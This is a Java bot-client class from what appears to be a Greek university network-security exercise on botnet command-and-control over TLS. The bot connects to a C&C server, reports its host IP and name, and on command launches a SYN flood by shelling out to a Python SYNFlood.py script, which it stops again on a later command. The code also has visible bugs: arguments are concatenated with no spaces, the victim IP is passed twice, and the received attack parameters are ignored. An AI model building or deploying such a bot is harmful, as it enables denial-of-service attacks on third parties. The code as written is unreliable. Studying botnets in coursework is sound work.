/**
 *    Ασφάλεια Δικτύων Υπολογιστών & Τεχνολογίες Προστασίας της Ιδιωτικότητας
 *                                   Άσκηση 1
 * Δημιουργία ασφαλούς διαύλου διαχείρισης botnet (C&C) με χρήση IPsec & TLS/SSL πρωτοκόλλων.
 * 
 *                      Πέππας Κωνσταντίνος 321/2011134
 *                      Σωτηρέλης Χρήστος   321/2012182
 *                      Χαϊκάλης Νικόλαος   321/2012200
 * 
 */

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.TrustManagerFactory;

public class ChatWithCC implements Serializable{
    private int port; //port epikoinwnias me ton C&C Server
    private String CC_IP; //ip tou C&C Server
    private SSLSocket socket;
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean keepWalking = true;
    private Messages msgs = new Messages();
    private String IP, PCname;
    private Process p1;
    
    /** 
     * @param port
     * @param CC_IP 
     * Diavazw tis @params apo ton admin otan thelei na dwsei
     * diaforetiko port k IP apo ta default.
     */
    public ChatWithCC(int port, String CC_IP) {
        this.port = port;
        this.CC_IP = CC_IP;
    }
    
    /**
     * @param port 
     * otan o admin thelei na dwsei mono diaforetiko port ara 
     * i CC_IP tha parei timi "localhost"
     */
    public ChatWithCC(int port) {
        this.port = port;
        CC_IP = "localhost";
    }

    /**
     * @param CC_IP 
     * Otan o admin thelei na dwsei mono diaforeretiki IP ara to port
     * to afinume default.
     */
    public ChatWithCC(String CC_IP) {
        this.CC_IP = CC_IP;
        port = 4444;
    }
    
    /**
     * Default Constructor gia tis default times tis epikoinwnias mas
     */
    public ChatWithCC(){
        CC_IP = "localhost";
        port = 4444;
    }
    
    /**
     * Methodos pou tin xrisimopoiw gia na edrewsw tin sindesi me ton
     * C&C Server
     */
    public void Start_Connection() throws InterruptedException{
        try {
            Certificates ca = new Certificates("Bot1");
            KeyManagerFactory BMotKeyManager = ca.FindPubKey();
            TrustManagerFactory trustManager = ca.FindCaKey();
            CreateSSLconection(BMotKeyManager, trustManager);
            oos = new ObjectOutputStream(socket.getOutputStream());
            ois = new ObjectInputStream(socket.getInputStream());
            IP = GetHostAddress(); //Diavazw tin IP tou mixanimatos.
            PCname = GetHostName(); //Daivazw to Name tou Mixanimatos.
            Chat_Thread.start(); //Ksekinaei to chat me ton C&C.
            //chating.SendMessage(msgs.GreetingsServer());
        } catch (NullPointerException | IOException ex) {
            System.out.println("Server is down or incorrect certificates.");
            Stop_Connection();
        }
    }
    
    /**
     * Methodos gia na stamatisw tin sindesi me ton C&C Server.
     */
    public void Stop_Connection(){
        keepWalking = false; //gia na stamatisei to chat alliws to thread dn ginete interrupt gt dn stamataei i liturgeia tou.
        Chat_Thread.interrupt();
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            if(socket !=null) socket.close();
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    /**
     * Dimiourgia enos thread pou tha xrisimopoiisw tin class chat
     * prokeimenou na dimiurgisw ena chat metaksi tou Bot kai tou
     * C&C Server.
     */
    private Thread Chat_Thread = new Thread(() -> { 
        Chat chating = new Chat(oos, ois, "C&C Server");
        Bot_Properties bp = new Bot_Properties(IP, PCname);
//        System.out.println("PC: " + bp.getBotPCname());
        chating.SendMessage(bp);
        //chating.SendMessage(msgs.StopConnection());
        while(keepWalking == true){
            Object readObj = chating.readMessage();
            /**
             * An to Bot stilei aitima na klisei tin sindesi k o Server tou apantisei
             * me "STOP_CONNECTION_WITH_THE_BOTMASTER" tote kleinw tin sindesi.
             */
            if(readObj.toString().equalsIgnoreCase(msgs.StopConnection())){
                Stop_Connection();
            }
            else if(readObj.toString().equalsIgnoreCase(msgs.BotSendMeYourInfos())){
                //bp = new Bot_Properties(IP, PCname);
               // chating.SendMessage(bp);
            }
            else if(readObj instanceof Attack_Properties){
                Attack_Properties ap = new Attack_Properties();
                Attack(ap.getIP_Victim(), ap.getIP_Victim());
            }
            else if(readObj.toString().equalsIgnoreCase(msgs.StopAttack())){
                StopAttack();
            }
        }
    });
    
    private void CreateSSLconection(KeyManagerFactory BMotKeyManager,  TrustManagerFactory trustManager){
        try {
            //use keys to create SSLSoket
            SSLContext ssl = SSLContext.getInstance("TLS");
            ssl.init(BMotKeyManager.getKeyManagers(), trustManager.getTrustManagers(), SecureRandom.getInstance("SHA1PRNG"));
            socket = (SSLSocket)ssl.getSocketFactory().createSocket(CC_IP, port);
            socket.startHandshake();
        } catch (NullPointerException | NoSuchAlgorithmException | IOException | KeyManagementException ex) {
            Stop_Connection();
        }
    }
    
    /**
     * Methodos poy kalw meso tis python to SynFlood 
     */
    private void Attack(String ip, String Victim_port){
        try {
            p1 = Runtime.getRuntime().exec("C:\\Users\\Tharador\\AppData\\Local\\Programs\\Python\\Python35-32\\python SYNFlood.py" + ip + Victim_port); 
            System.out.println("SynFlood is running !!!");
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    
    private void StopAttack(){
        System.out.println("Retreat my Bots!!!!");
        p1.destroy();
    }
    
    /**
     * Methodos pou kanw return tin local ip tou mixanimatos.
     */
    private String GetHostAddress() throws UnknownHostException{
        return Inet4Address.getLocalHost().getHostAddress();
    }
    
    /**
     * Methodos pou kanw return to name tou mixanimatos.
     */
    private String GetHostName() throws UnknownHostException{
        return Inet4Address.getLocalHost().getHostName();
    }
}
